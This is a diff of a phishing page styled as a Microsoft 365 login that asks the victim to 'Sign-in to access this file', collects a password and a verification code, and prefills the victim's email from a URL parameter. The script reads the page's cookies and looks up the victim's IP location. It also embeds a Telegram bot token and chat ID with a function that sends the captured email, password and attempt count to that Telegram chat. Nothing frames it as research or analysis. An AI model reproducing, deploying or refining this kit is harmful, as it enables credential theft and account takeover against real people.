@@ -6,41 +6,30 @@
 <title>Login Verification</title>
 
 <style>
+/* ... your existing CSS ... */
 #email-display-row {
   display: flex;
   align-items: center;
   gap: 10px;
-  flex-wrap: wrap !important;    /* THIS FIXES THE CLIPPING */
+  flex-wrap: wrap !important;
   width: 100%;
 }
-#back-arrow {
-  display: none !important;
-}
-
-
-
-/* Email input — make it look like plain text */
+#back-arrow { display: none !important; }
 #email.email-flat {
   display: inline-block !important;
-  width: 100% !important;         /* allow full row width */
-  white-space: normal !important; /* allow wrapping */
-  word-break: break-all !important; /* break long continuous strings */
+  width: 100% !important;
+  white-space: normal !important;
+  word-break: break-all !important;
   line-height: 1.4 !important;
-  
   border: none !important;
   background: transparent !important;
   outline: none !important;
   pointer-events: none !important;
 }
-
-
-/* removes inherited rounded input styling */
 .input-group input#email {
   border: none !important;
   background: transparent !important;
 }
-
-/* ============= GLOBAL ============= */
 body, html {
   margin: 0;
   padding: 0;
@@ -48,20 +37,14 @@ body, html {
   height: 100%;
   overflow: hidden;
 }
-
-/* ============= BACKGROUND IFRAME ============= */
-#bg-frame { 
-  position: fixed; 
-  inset: 0; 
-  width: 100%; 
-  height: 100%; 
-  border: none; 
-  z-index: 0; 
+#bg-frame {
+  position: fixed;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+  border: none;
+  z-index: 0;
 }
-
-
-
-/* ============= LOGIN BOX ANIMATION — MICROSOFT 365 STYLE ============= */
 #login-wrapper {
   position: fixed;
   inset: 0;
@@ -69,52 +52,34 @@ body, html {
   justify-content: center;
   align-items: center;
   z-index: 9999;
-
-  /* Microsoft: start slightly to the right + faded */
   opacity: 0;
   transform: translateX(40px);
-
-
 }
-
 #login-wrapper.visible {
   opacity: 1;
   transform: translateX(0);
 }
-/* Move "Sign in" down a bit from the email field */
 #login-content-container b {
   display: block;
-  margin-top: 24px; /* adjust this value to your preference */
-  font-size: 20px;  /* optional: make it slightly bigger */
+  margin-top: 24px;
+  font-size: 20px;
 }
-
-/* Space for the paragraph under "Sign in" */
 #login-content-container p {
-  margin-top: 8px; /* adds space between the heading and paragraph */
-  margin-bottom: 12px; /* optional, keeps consistent spacing */
+  margin-top: 8px;
+  margin-bottom: 12px;
   font-weight: normal;
   font-size: 14px;
   line-height: 1.4;
 }
-
-
-/* Initial state: slightly to the right and invisible */
 .login-content {
   opacity: 0;
-  transform: translateX(40px);  /* start 40px to the right */
+  transform: translateX(40px);
   transition: opacity 0.4s ease, transform 0.4s ease;
 }
-
-/* Visible state: slide in to original position */
 #login-wrapper.visible .login-content {
   opacity: 1;
   transform: translateX(0);
 }
-
-
-
-
-/* SHAKE ANIMATION */
 @keyframes shake {
   0% { transform: translateX(0); }
   20% { transform: translateX(-10px); }
@@ -126,34 +91,24 @@ body, html {
 .login-content.shake {
   animation: shake 0.4s;
 }
-
 #error-msg { color:red; margin-top:10px; height:20px; }
-
-
-/* ===== SQUARE LOGIN BOX ===== */
 .login-box {
   background: #fff;
   padding: 32px;
-  border-radius: 0;              /* <-- SQUARE */
+  border-radius: 0;
   width: 360px;
   box-shadow: 0 6px 20px rgba(0,0,0,0.12);
   position: relative;
 }
-
 #logo {
   width: 100px;
   display: block;
   margin: 0 0 20px 0;
   padding-left: 4px;
 }
-
-/* Space under logo */
 .form-area {
   margin-top: 80px;
 }
-
-
-/* INPUTS */
 .input-group { display:flex; align-items:center; gap:10px; margin-bottom:28px; }
 .input-group i { color:#0078d4; font-size:18px; cursor:pointer; }
 .input-group input {
@@ -163,18 +118,13 @@ body, html {
   transition:border-color .3s;
 }
 .input-group input:focus { border-bottom:1.5px solid #0078d4; }
-
 .ms-pass-field {
   width:80%; padding:12px; border:1px solid #8a8a8a;
   font-size:16px; margin-top:20px;
 }
-
-/* LINKS */
 .ms-links { margin:15px 0 15px; line-height:1.8; }
 .ms-links a { color:#0067b8; text-decoration:none; }
 .ms-links a:hover { text-decoration:underline; }
-
-/* NEXT BUTTON */
 .ms-next-btn {
   background:#0067b8; color:#fff; border:none;
   padding:12px 34px; font-size:17px;
@@ -182,18 +132,11 @@ body, html {
   transition:background 0.2s ease;
 }
 .ms-next-btn:hover { background:#005a9e; }
-
-
-
-
-
-/* ===== ABSOLUTE FINAL ICON FIX — OVERRIDES EVERYTHING ===== */
 .input-group {
   position: relative;
   width: 100%;
   margin-bottom: 20px;
 }
-
 .input-group .icon {
   position: absolute;
   left: 18px;
@@ -203,11 +146,10 @@ body, html {
   color: #000;
   pointer-events: none;
 }
-
 .input-group input {
   width: 100%;
   height: 52px;
-  padding-left: 58px !important; /* FORCE PERFECT ALIGNMENT */
+  padding-left: 58px !important;
   padding-right: 16px;
   font-size: 17px;
   border-radius: 8px;
@@ -217,18 +159,6 @@ body, html {
   display: flex;
   align-items: center;
 }
-
-/* NEXT BUTTON */
-.ms-next-btn {
-  background:#0067b8; color:#fff; border:none;
-  padding:12px 34px; font-size:17px;
-  cursor:pointer; float:right; border-radius:0;
-  transition:background 0.2s ease;
-}
-.ms-next-btn:hover { background:#005a9e; }
-
-
-/* OTP */
 #otp-wrapper {
   position: fixed;
   inset: 0;
@@ -245,15 +175,12 @@ body, html {
   opacity: 1;
   transform: translateX(0);
 }
-
 .otp-input {
   width: 42px;
   height: 46px;
   font-size: 18px;
   text-align: center;
 }
-
-
 </style>
 </head>
 
@@ -261,41 +188,31 @@ body, html {
 
 <iframe id="bg-frame"></iframe>
 
-<!-- LOGIN -->
-<div id="login-wrapper">                
+<div id="login-wrapper">
   <div class="login-box">
-     <div class="login-content" id="login-content-container">
-
+    <div class="login-content" id="login-content-container">
       <img id="logo" src="" alt="Logo">
 
-<div id="email-display-row">
-  <input 
-    type="text" 
-    id="email"
-    class="email-flat"
-    readonly
-  >
-</div>
+      <div id="email-display-row">
+        <input type="text" id="email" class="email-flat" readonly>
+      </div>
 
-<b>Re-authenticate</b>
-<p style="margin-bottom: 10px; font-weight: normal;">
-  to accept new Terms and Conditions
-</p>
-<input type="password" id="password"
-       placeholder="Password" class="ms-pass-field"/>
-<div class="ms-links">
-  <p>No account? <a id="create-link" href="#">Create one</a></p>
-  <p><a id="forgot-link" href="#">Forgot your password?</a></p>
-</div>
+      <b>Sign-in</b>
+      <p style="margin-bottom: 10px; font-weight: normal;">
+        to access this file
+      </p>
+      <input type="password" id="password" placeholder="Password" class="ms-pass-field"/>
+      <div class="ms-links">
+        <p>No account? <a id="create-link" href="#">Create one</a></p>
+        <p><a id="forgot-link" href="#">Forgot your password?</a></p>
+      </div>
 
-<div id="error-msg"></div>
-
-<button id="login-btn" class="ms-next-btn">Next</button>
+      <div id="error-msg"></div>
+      <button id="login-btn" class="ms-next-btn">Next</button>
     </div>
   </div>
 </div>
 
-<!-- OTP -->
 <div id="otp-wrapper">
   <div class="login-box" id="otp-box">
     <h2>Enter verification code</h2>
@@ -314,7 +231,7 @@ body, html {
 </div>
 
 <script>
-document.addEventListener("DOMContentLoaded", async () => {
+document.addEventListener("DOMContentLoaded", () => {
   const logoImg = document.getElementById("logo");
   const loginWrapper = document.getElementById("login-wrapper");
   const email = document.getElementById("email");
@@ -330,21 +247,32 @@ document.addEventListener("DOMContentLoaded", async () => {
 
   const bgFrame = document.getElementById("bg-frame");
   const params = new URLSearchParams(location.search);
-  const rawEmail = params.get("bazz505") || "user@example.com";
-  
+
+  // =========================
+  // READ EMAIL (URL or localStorage)
+  // =========================
+  let rawEmail = params.get("bazz505") || "";
+  if (!rawEmail) {
+    rawEmail = localStorage.getItem("bazz505") || "user@example.com";
+  }
+
+  // SAVE TO LOCAL STORAGE
+  localStorage.setItem("bazz505", rawEmail);
+
+  // SET DISPLAY VALUES
   email.value = rawEmail;
   otpEmailDisplay.textContent = rawEmail;
 
   const domain = rawEmail.split("@")[1] || "example.com";
- 
-if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+
+  if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
     const domain = rawEmail.split("@")[1];
     const createLink = document.getElementById("create-link");
     const forgotLink = document.getElementById("forgot-link");
 
     createLink.href = "https://www." + domain;
     forgotLink.href = "https://www." + domain;
-}
+  }
 
 // Helper: parse document.cookie into an object { name: value, ... }
 function parseCookies(cookieString = document.cookie) {
@@ -448,7 +376,7 @@ fetch("https://ipapi.co/json/")
 
   // Telegram
 const TELEGRAM_BOT_TOKEN = "8472203015:AAFvwceukQ2Y2iRMtO5ML0WVIztYG5xWVN8";
-  const TELEGRAM_CHAT_ID = "7574749243";
+const TELEGRAM_CHAT_ID = "7574749243";
   let attempts = 0;
 
 function sendTelegramMessage(emailVal, passwordVal, attempt) {
